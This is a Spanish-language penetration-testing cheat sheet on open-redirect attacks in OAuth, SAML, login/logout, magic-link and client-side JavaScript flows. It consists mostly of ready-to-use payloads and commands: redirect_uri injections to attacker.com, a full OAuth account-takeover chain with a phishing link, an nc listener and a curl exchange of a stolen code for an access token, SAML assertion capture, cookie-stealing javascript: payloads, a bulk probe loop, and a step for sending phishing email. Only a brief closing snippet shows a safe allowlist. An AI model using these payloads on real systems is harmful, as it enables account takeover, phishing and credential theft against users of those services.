---
aliases:
  - OAuth Redirect URI
  - SAML Redirect
  - Login Redirect
  - Magic Link Redirect
tags:
  - vuln/open-redirect
  - vuln/auth-bypass
  - technique/credential-access
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Open Redirect]]"
---
# Open Redirect - Vectores Específicos

---

## OAuth `redirect_uri` Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://idp.target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker.com/cb&scope=email` | Code grant interceptado por atacante | redirect_uri sin validar. |
| `https://idp.target.com/oauth/authorize?response_type=token&client_id=APP&redirect_uri=https://attacker.com&scope=email` | Implicit flow → access_token directo en fragment | response_type=token habilitado. |
| `?redirect_uri=https://target.com.attacker.com/cb` | Suffix bypass | Validator startsWith. |
| `?redirect_uri=https://target.com@attacker.com/cb` | Userinfo bypass | Parser confusion. |
| `?redirect_uri=https://target.com/redirect?url=https://attacker.com` | Chain con OR interno | Target tiene OR + IdP confía. |
| `?redirect_uri=https://target.com/callback/../malicious` | Path traversal escape | startsWith con path. |
| `?redirect_uri=https://taken-subdomain.target.com/cb` | Subdomain takeover combo | Wildcard `*.target.com` + dangling. |
| `?redirect_uri=https%3A%2F%2Fattacker.com` | URL-encoded bypass | Decode-after-validate. |
| Post-callback: `curl -X POST https://idp.target.com/oauth/token -d "code=$STOLEN_CODE&client_id=APP&client_secret=$LEAKED&redirect_uri=https://attacker.com/cb"` | Exchange code por access_token | Code stolen + secret leaked. |
^or-specific-oauth

### OAuth ATO chain completa

```bash
# 1. Phishing link a víctima
LINK="https://idp.target.com/oauth/authorize?client_id=abc&response_type=code&redirect_uri=https://attacker.com/cb&scope=read+write&state=X"

# 2. Listener atacante
nc -lvnp 80
# Recibe: GET /cb?code=AUTH_CODE&state=X

# 3. Exchange code por access_token (si client_secret público en frontend)
curl -X POST https://idp.target.com/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=abc" \
  -d "client_secret=PUBLIC_LEAK" \
  -d "redirect_uri=https://attacker.com/cb"

# 4. Acceder API target con access_token
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me
```

---

## SAML Response Redirect

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://target/sso/saml?RelayState=https://attacker.com` | Post-auth redirect controlled | SAML SSO con RelayState reflejado. |
| `https://target/sso/saml?SAMLRequest=$REQ&RelayState=https://attacker.com` | IdP-initiated SSO con redirect malicious | IdP-initiated flow. |
| `https://target/sso/saml?AssertionConsumerServiceURL=https://attacker.com/acs` | Atacante recibe SAML assertion | IdP acepta ACS URL del request. |
| Inject `<saml:Subject><NameID>...</NameID><SubjectConfirmation Method="bearer"><SubjectConfirmationData Recipient="https://attacker.com/"/></SubjectConfirmation></saml:Subject>` | Recipient redirect via SAML | XML manipulation + sign issues. |
| `?RelayState=javascript:alert(1)` | XSS via RelayState reflejado | Browser-side reflection. |
| Listener `nc -lvnp 80` para capturar SAML response | Steal SAML assertion → replay | Post-redirect intercept. |
^or-specific-saml

---

## Login / Logout Flow Redirect

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI "https://target/login?next=https://attacker.com"` | Post-auth redirect a phishing | Login con next param. |
| `curl -sI "https://target/login?next=javascript:alert(1)"` | XSS en post-auth landing | Reflected as href. |
| `curl -sI "https://target/logout?next=https://attacker.com/fake-login"` | Logout + redirect a phishing login | Re-login credential theft chain. |
| `curl -sI "https://target/reset?token=$T&next=https://attacker.com"` | Post-reset redirect | Attack window post password change. |
| `curl -sI "https://target/signup?next=https://attacker.com"` | Post-signup redirect | New users vulnerable. |
| `curl -sI "https://target/email-confirm?token=$T&next=https://attacker.com"` | Post-email-confirm redirect | High-trust UX moment. |
| `curl -sI "https://target/2fa/setup?next=https://attacker.com"` | Post-2FA-setup redirect | Auth flow chain. |
| `for ep in login logout signup reset email-confirm 2fa/setup billing checkout; do curl -sI "https://target/$ep?next=https://attacker.com" \| grep -i location; done` | Bulk endpoint probe | Discovery. |
^or-specific-login

---

## Email Magic Link Redirect

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://target.com/auth?token=$T&next=https://attacker.com` (en email phishing) | Post-magic-link redirect | Magic link con next preservado. |
| `https://click.target.com/track?url=https://attacker.com` (click tracker abuse) | Tracker URL → final URL controlado | Marketing click tracker reflejado. |
| `https://target.com/unsubscribe?token=$T&next=https://attacker.com` | Unsubscribe + redirect chain | One-click unsubscribe vector. |
| `https://target.com/reset?token=$T&next=https://attacker.com` | Reset + redirect → phishing landing | Password reset flow. |
| `https://target.com/verify?token=$T&next=javascript:alert(1)` | XSS via verify page | Verify reflejado. |
| `python3 -c "import smtplib; ..."` (script para enviar phishing email con link) | Email envio para attack | Setup phishing campaign. |
| `curl -sI "https://target.com/auth?token=any&next=https://attacker.com"` | Probe sin token válido (testing) | Pre-PoC validation. |
^or-specific-magiclink

---

## JS-Based Client-Side Redirect

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://target/page#next=javascript:alert(document.cookie)` | DOM XSS via location.href | Frontend lee param y asigna location.href. |
| `https://target/page?next=javascript:alert(1)` | Same con search param | Standard reflected. |
| Inspeccionar JS: `curl -s https://target/main.js \| grep -E 'location\.(href\|replace\|assign)\s*=\s*[a-zA-Z]'` | Identificar sinks vulnerable client-side | Pre-attack source review. |
| `https://target/page?next=//attacker.com` | Protocol-relative en client-side | location.assign permissive. |
| `https://target/spa#/redirect?to=https://attacker.com` | SPA route con redirect param | React/Vue/Angular Router. |
| Browser console: `history.pushState({}, '', '//attacker.com')` post-XSS | Manipulación pushState | XSS combo. |
| Service Worker exploit: register SW que intercepta fetch + responde redirect | Persistent client-side redirect | PWA con SW vulnerable. |
^or-specific-js

### Workflow client-side OR (referencia)

```javascript
// VULN — client-side redirect from URL param
const params = new URLSearchParams(location.search);
const next = params.get('next');
location.href = next;  // OPEN REDIRECT + DOM XSS

// Atacante:
// https://target.com/login?next=javascript:alert(document.cookie)
// → location.href = 'javascript:alert(...)' → XSS

// SAFE
const ALLOWED = ['/dashboard', '/profile', '/settings'];
if (ALLOWED.includes(next)) location.href = next;
```

---
